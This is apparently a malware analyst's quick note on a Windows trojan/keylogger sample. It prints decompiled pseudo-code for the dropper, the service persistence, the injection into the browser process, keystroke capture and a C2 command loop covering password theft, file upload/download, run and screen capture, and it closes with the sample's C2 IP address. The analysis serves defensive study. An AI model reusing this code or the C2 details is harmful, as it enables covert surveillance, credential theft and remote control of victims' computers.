# [Quick Note] Pseudo code sample 979aed7eef79df123e0425eb094030ad

# Overview
MD5: 979aed7eef79df123e0425eb094030ad </br>
Threat miner: https://www.threatminer.org/av.php?q=Win32/Trojan.Spy.210#gsc.tab=0&gsc.q=Win32%2FTrojan.Spy.210&gsc.page=1 </br>

This sample is pe file called with another name is ```wuaucltl.exe```, this sample using techniques load resource inside resource of malware store data of another pe file and it self loading by malware. It's loaded form DLL files.

# I. Stage 1: Analyze Main function
This function setup a few option for service before but into this triiger a few functions to create and load resouce of malware to new file. Services will call with name ```system Idle Process``` and services proc will trigger call function ```f_handle_setup_status_services``` </br>
```
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
  SERVICE_TABLE_ENTRYA ServiceStartTable; // [esp+0h] [ebp-114h]

  ServiceStartTable.lpServiceName = ServiceName;// Service Name = "system Idle Process"
  ServiceStartTable.lpServiceProc = (LPSERVICE_MAIN_FUNCTIONA)f_handle_setup_status_services;// handle setup status service and spawn data into process explorer
  v6 = 0;
  v7 = 0;
  if ( !f_get_system_directory_and_find_files() )// find file \\wuaucltl.exe into system directory if not found create file
    f_create_new_file_and_load_resource();      // create 2 file: \\wuaucltl.exe with attribute base on \\ntoskrnl.exe and \\pshelp.dll with data load from resource of malware
  if ( f_handle_open_service() )                // handle open services
  {
    StartServiceCtrlDispatcherA(&ServiceStartTable);// Connects the main thread of a service process to the service control manager, which causes the thread to be the service control dispatcher thread for the calling process.
  }
  else
  {
    Buffer = 0;
    memset(&v9, 0, 0x100u);
    v10 = 0;
    v11 = 0;
    GetSystemDirectoryA(&Buffer, 0x104u);
    strncat(&Buffer, aWuaucltlExe, 0x104u);     // append system directory with + \\wuaucltl.exe
    f_handle_create_and_start_services(&Buffer);// create and open service with path point to wuaucltl.exe as backdoor
  }
  return 0;
}
```
# 1. Function f_handle_setup_status_services
This function setup detail status process service and it another missions is call sub fucntion ```f_check_status_services``` to get process id of ```explorer``` and spawn data of ```pshelp.dll``` into this process. After that, it's create thread for ```pshelp.dll``` </br>
```
SERVICE_STATUS_HANDLE __stdcall f_handle_setup_status_services(int a1, int a2)
{
  SERVICE_STATUS_HANDLE result; // eax

  result = RegisterServiceCtrlHandlerA(ServiceName, HandlerProc);// function to register a control handler function with the control dispatcher.
                                                // With service name = system Idle Process
  hServiceStatus = result;
  if ( result )
  {
    ServiceStatus.dwServiceType = 16;
    ServiceStatus.dwServiceSpecificExitCode = 0;
    if ( f_setup_status_services(2u, 0, 0xBB8u) )
      f_check_status_services();
    result = f_setup_status_services(1u, 0, 0xBB8u);
  }
  return result;
}
```
```
DWORD (__stdcall *f_check_status_services())(LPVOID lpThreadParameter)
{
  if ( !f_setup_status_services(4u, 0, 0xBB8u) )
    return 0;
  ApplicationName = 0;
  memset(&v3, 0, 0x100u);
  v4 = 0;
  v5 = 0;
  if ( !f_return_path_internet_explorer(&ApplicationName, 0x104u) )
    return 0;
  for ( i = f_get_process_id(&ApplicationName); !i; i = f_get_process_id(&ApplicationName) )
    Sleep(0x64u);
  Buffer = 0;
  memset(&v7, 0, 0x100u);
  v8 = 0;
  v9 = 0;
  GetSystemDirectoryA(&Buffer, 0x104u);         // Retrieves the path of the system directory.
  strncat(&Buffer, aPshelpDll, 0x104u);         // Append characters from string + \\pshelp.dll
  return f_open_process_and_create_thread(&Buffer, i);// spawn data into process explorer
}
```
# 2. Function f_create_new_file_and_load_resource
Back to main function, before it call function ```f_create_new_file_and_load_resource``` main function will trigger function ```f_get_system_directory_and_find_files``` to find files ```wuaucltl.exe``` existed or not. If file existed, it not call function ```f_create_new_file_and_load_resource``` to create file or if not find this files it will call this functions. </br>
Function ```f_create_new_file_and_load_resource``` will check and get attribute of file ```ntoskrnl.exe``` (NT Operating System Kernel)
and call sub function ```f_copy_file``` to replace new file ```wuaucltl.exe``` to old file ```ntoskrnl.exe```. </br>
Afer that, it create another file with name ```pshelp.dll``` data of file will load into resource of malware through 3 API functions ```FindResourceA``` ```LoadResource``` ```LockResource``` with name if resource is ```DLL```. </br>
```
signed int f_create_new_file_and_load_resource()
{
  GetSystemDirectoryA(&Buffer, 0x104u);         // Retrieves the path of the system directory.
  strncpy(&FileName, &Buffer, 0x104u);          // copy return value system directory into buffer FileName
  strncat(&FileName, aNtoskrnlExe, 0x104u);     // append system directory with + \\ntoskrnl.exe (NT Operating System Kernel)
  GetFileAttributesExA(&FileName, 0, &FileInformation);// Retrieves attributes for a specified files after append strings
  strncpy(&NewFileName, &Buffer, 0x104u);       // copy return value system directory into buffer NewFileName
  strncat(&NewFileName, aWuaucltlExe, 0x104u);  // append system directory NewFileName with + \\wuaucltl.exe
  f_copy_file(&NewFileName);                    // function overwrites the existing file with FileName = ntoskrnl.exe by NewFileName = wuaucltl.exe
  v0 = CreateFileA(&NewFileName, 0x40000000u, 7u, 0, 3u, 0x80u, 0);// Create new file <NewFileName>
  if ( v0 == (HANDLE)-1 )
    return 0;
  SetFileTime(v0, &CreationTime, &LastAccessTime, &LastWriteTime);// Sets the date and time that the specified file or directory was created, last accessed, or last modified.
  CloseHandle(v0);
  strncpy(&v27, &Buffer, 0x104u);               // copy return value system directory into buffer v27
  strncat(&v27, aPshelpDll, 0x104u);            // append string system directory with + \\pshelp.dll
  v2 = CreateFileA(&v27, 0x40000000u, 7u, 0, 1u, 0x80u, 0);// create file \\pshelp.dll
  v3 = GetModuleHandleA(0);
  v4 = v3;
  v5 = FindResourceA(v3, (LPCSTR)0x66, Type);   // Find resource with name DLL
  v6 = v5;
  v7 = LoadResource(v4, v5);                    // load resource
  lpBuffer = LockResource(v7);                  // Retrieves a pointer to the specified resource in memory.
  v9 = SizeofResource(v4, v6);                  // Retrieves the size, in bytes, of the specified resource.
  WriteFile(v2, lpBuffer, v9, &NumberOfBytesWritten, 0);// write data of resource into \\pshelp.dll
  FreeLibrary(v4);
  SetFileTime(v2, &CreationTime, &LastAccessTime, &LastWriteTime);
  CloseHandle(v2);
  return 1;
}
```
Afer done, main function trigger function ```f_handle_open_service``` to open service and start service. If can't open service, it call function ```f_handle_create_and_start_services``` it handle create service with name ```wuaucltl.exe``` and start service. </br>

# II. Stage 2: Dump data into resource and analyze
Using tool ```Resource Hacker``` to view resource ```DLL``` of malware and dump it. After dump it, replace with name ```pshelp.dll``` for similar process of malware executed. With file type .dll but header of this file is PE files. </br>

Overview, this dll file have a mission similar keylogger. It have a few option as scan disk drive, upload/download file and capture keyboard of victim machine. Because quick note, so can't list detail into a few sub function so this note a few main function of dll file. </br>

Into main DLLfunction, it created thread to call function ```f_handle_hooking_and_check_keyboard```. This function will call a few sub function to chekcing file ```wuaucltl.exe``` and hooking sys files and execute sub function similar options of keylogger through create thread of ```StartAddress``` function. </br>
```
BOOL __stdcall DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
  if ( fdwReason == 1 )
  {
    hmod = hinstDLL;
    hModule = GetModuleHandleA(0);
    dword_100069C0 = (int)CreateThread(0, 0, f_handle_hooking_and_check_keyboard, 0, 0, 0);
    result = 1;
  }
  else
  {
    if ( !fdwReason )
    {
      dword_100069CC = 1;
      ExitThread(0);
    }
    result = 1;
  }
  return result;
}
```
```
DWORD __stdcall f_handle_hooking_and_check_keyboard(LPVOID lpThreadParameter)
{
  f_read_files_and_xor_files();
  if ( !f_split_path_and_compare_with_iexplore() )
    goto LABEL_6;
  v1 = GetCurrentThreadId();                    // Retrieves the thread identifier of the calling thread.
  v2 = CreateFileMappingA((HANDLE)0xFFFFFFFF, 0, 4u, 0, 4u, Name);// Creates or opens a named or unnamed file mapping object for a specified file with Name tkdThreadid
  if ( v2 )
  {
    v3 = MapViewOfFile(v2, 6u, 0, 0, 0);
    if ( v3 )
      *v3 = v1;
    UnmapViewOfFile(v3);
    f_handle_hooking_sys_files();
    CreateThread(0, 0, StartAddress, 0, 0, 0);
    while ( 1 )
    {
LABEL_6:
      if ( PeekMessageA(&Msg, 0, 0x465u, 0x465u, 1u) )
      {
        qmemcpy(&v5, &Msg, 0x1Cu);
        f_handle_print_output_file();
      }
      if ( PeekMessageA(&Msg, 0, 0x464u, 0x464u, 1u) )
      {
        qmemcpy(&v5, &Msg, 0x1Cu);
        f_handle_check_keyboard_and_printing(v5, v6, v7, v8);
      }
      if ( PeekMessageA(&Msg, 0, 0x466u, 0x466u, 1u) )
      {
        qmemcpy(&v5, &Msg, 0x1Cu);
        sub_10001730(v5, v6, v7, v8);
      }
      if ( PeekMessageA(&Msg, 0, 0x467u, 0x467u, 1u) )
      {
        qmemcpy(&v5, &Msg, 0x1Cu);
        sub_10001830();
      }
      Sleep(0xAu);
    }
  }
  return 0;
}
```
Into ```StartAddress``` function, this function have a few missions create socket, resolution IP and send/receive data with C2. </br>
```
DWORD __stdcall StartAddress(LPVOID lpThreadParameter)
{
  buf = 0;
  memset(&v19, 0, 0x3FCu);
  v20 = 0;
  v21 = 0;
  WSAStartup(0x101u, &WSAData);
  while ( 1 )
  {
    v1 = socket(2, 1, 6);
    f_check_hostname_and_convert_to_ip((unsigned int)&cp);
    name.sa_family = 2;
    *(_WORD *)name.sa_data = htons(hostshort[0]);// function converts a u_short from host to TCP/IP network byte order
    *(_DWORD *)&name.sa_data[2] = inet_addr(&cp);// The inet_addr function converts a string containing an IPv4 dotted-decimal address into a proper address
    [....]
          v2 = f_recv_data_and_compare_string_to_select_option(&buf, &FileName, 0x104u);// this function check and return with 12 values similar to 12 options
          if ( v2 != 13 )                       // check value of v2 equal 12 or not
          {
            v3 = f_trigger_sub_function_base_on_v2(v2, v1, 0, (int)&v7, &FileName);
            if ( v3 == (char *)-1 )
              goto LABEL_14;
            if ( v3 && dword_100069CC )
              goto LABEL_17;
          }
        }
      }
      while ( WSAGetLastError() == 10060 && !(unsigned __int8)sub_10003450(&cp) );
LABEL_14:
      if ( dword_100069CC )
        break;
    }
    closesocket(v1);
LABEL_16:
    Sleep(0x1F4u);
  }
LABEL_17:
  if ( v1 )
    closesocket(v1);
  return 1;
}
```
With function ```f_recv_data_and_compare_string_to_select_option``` handle receive data from attacker and compare with a few strings. This string similar options with a few missions of keylogger: scan disk drive, upload file, download file, .... And it return value is number with number represent for this options. </br>
```
  if ( strcmpi(&Dest, aGetPasswordInf) )        // compare Dest with "Get Password Information"
    v5 = v7;
  else
    v5 = 0;
  if ( !strcmpi(&Dest, aGetKeyInputInf) )       // compare Dest with "Get Key Input Information"
    v5 = 1;
  if ( !strcmpi(&Dest, aGetDiskList) )          // compare Dest with "Get Disk List"
    v5 = 2;
  if ( !strcmpi(&Dest, aGetFileList) )          // compare Dest with "Get File List"
    v5 = 3;
  if ( !strcmpi(&Dest, aDownloadFile) )         // compare Dest with "Download File"
    v5 = 4;
  if ( !strcmpi(&Dest, aUploadFile) )           // compare Dest with "Upload File"
    v5 = 5;
  if ( !strcmpi(&Dest, aDeleteFile) )           // compare Dest with "Delete File"
    v5 = 6;
  if ( !strcmpi(&Dest, aRunFile) )              // compare Dest with "Run File"
    v5 = 7;
  if ( !strcmpi(&Dest, aGetenFile) )            // Compare Dest with "GetEN File"
    v5 = 8;
  if ( !strcmpi(&Dest, aGetcnFile) )            // compare Dest with "GetCN File"
    v5 = 9;
  if ( !strcmpi(&Dest, aDeleteKeyboard) )       // compare Dest with "Delete Keyboard"
    v5 = 10;
  if ( !strcmpi(&Dest, aLookScreen) )           // compare Dest with "Look Screen"
    v5 = 11;
  if ( !strcmpi(&Dest, aDead) )                 // compare Dest with "Dead"
    v5 = 12;
  return v5;
```
After receive return value, function ```f_trigger_sub_function_base_on_v2``` will trigger sub function base on value return of ```f_recv_data_and_compare_string_to_select_option```. With a few sub function will handle specific task. </br>
```
   case 0:
      result = f_open_file_mapping_and_mapping_view(s);
      break;
    case 2:
      result = (char *)f_handle_scan_drive_type(s);
      break;
    case 3:
      result = (char *)f_handle_get_list_files(s, (char *)lpFileName, strlen(lpFileName));
      break;
    case 4:
      result = (char *)f_handle_download_files(s, lpFileName);
      break;
    case 5:
      result = (char *)f_handle_upload_files(s, lpFileName);
      break;
    case 6:
      result = (char *)f_handle_delete_file(s, lpFileName);
      break;
    case 7:
      result = (char *)f_handle_run_files(s, (char *)lpFileName);
      break;
    case 8:
      result = (char *)f_handle_get_pshelpEn_files(s);
      break;
    case 9:
      result = (char *)f_handle_get_pshelpCn_files(s);
      break;
    case 10:
      result = (char *)f_handle_open_files(s);
      break;
    case 11:
      result = (char *)f_handle_checking_can_execute_or_not();// return 1 means that there is some error while executing the program
      break;
    case 12:
      result = (char *)f_handle_checking_exist_or_not(s);
```
Into ```f_handle_check_keyboard_and_printing```, this function using a few windows API functions as ```GetAsyncKeyState``` ```GetKeyNameTextA``` ```MapVirtualKeyA``` ```GetKeyState``` to capture keyboard of victim machine. </br>
```
__int16 __cdecl f_handle_check_keyboard_and_printing(int a1, int a2, int vKey, LONG lParam)
{
  LOWORD(v4) = GetAsyncKeyState(vKey);          // Determines whether a key is up or down at the time the function is called
  if ( (signed __int16)v4 <= 0 )
  {
    LOWORD(v4) = GetAsyncKeyState(vKey);        // Retrieves a string that represents the name of a key.
    if ( (v4 & 0x8000u) != 0 )
    {
      v4 = f_handle_get_text_into_victim_machine();
      if ( v4 )
      {
        GetKeyNameTextA(lParam, &String, 20);   // Retrieves a string that represents the name of a key.
        v5 = 0;
        v6 = Str1;                              // v6 = "Tab"
        do
        {
          if ( !strcmp(&String, v6) )
          {
            LOWORD(v4) = f_printing_output_file(&Str1[20 * v5]);
            return v4;
          }
          v6 += 20;
          ++v5;
        }
        while ( (signed int)v6 < (signed int)&buff_strings_keyboard );
        v7 = MapVirtualKeyA(vKey, 2u);
        if ( GetKeyState(20) )
        {
          v8 = GetAsyncKeyState;
          if ( GetAsyncKeyState(16) < 0 )
          {
            LOWORD(v4) = sub_10001090(v7, 1, 1);
            return v4;
          }
        }
        else
        {
          v8 = GetAsyncKeyState;
        }
        if ( GetKeyState(20) && v8(16) >= 0 )
        {
          LOWORD(v4) = sub_10001090(v7, 1, 0);
        }
        else if ( v8(16) >= 0 || GetKeyState(20) )
        {
          LOWORD(v4) = sub_10001090(v7, 0, 0);
        }
        else
        {
          LOWORD(v4) = sub_10001090(v7, 0, 1);
        }
      }
    }
  }
  return v4;
}
```

# Interested strings
With C2, have a diffcult to detect IP because this IP not existed base as string and not using tools as ```pestudio``` to check it. If have a time to analyze ```pshelp.dll``` will call a sub function read file ```wuaucltl.exe``` and xor data into file with key. Afer xor, it saved this data into variable and using function ```f_check_hostname_and_convert_to_ip``` convert this variable to IP <br>
```
C2: 103.224.182.251
```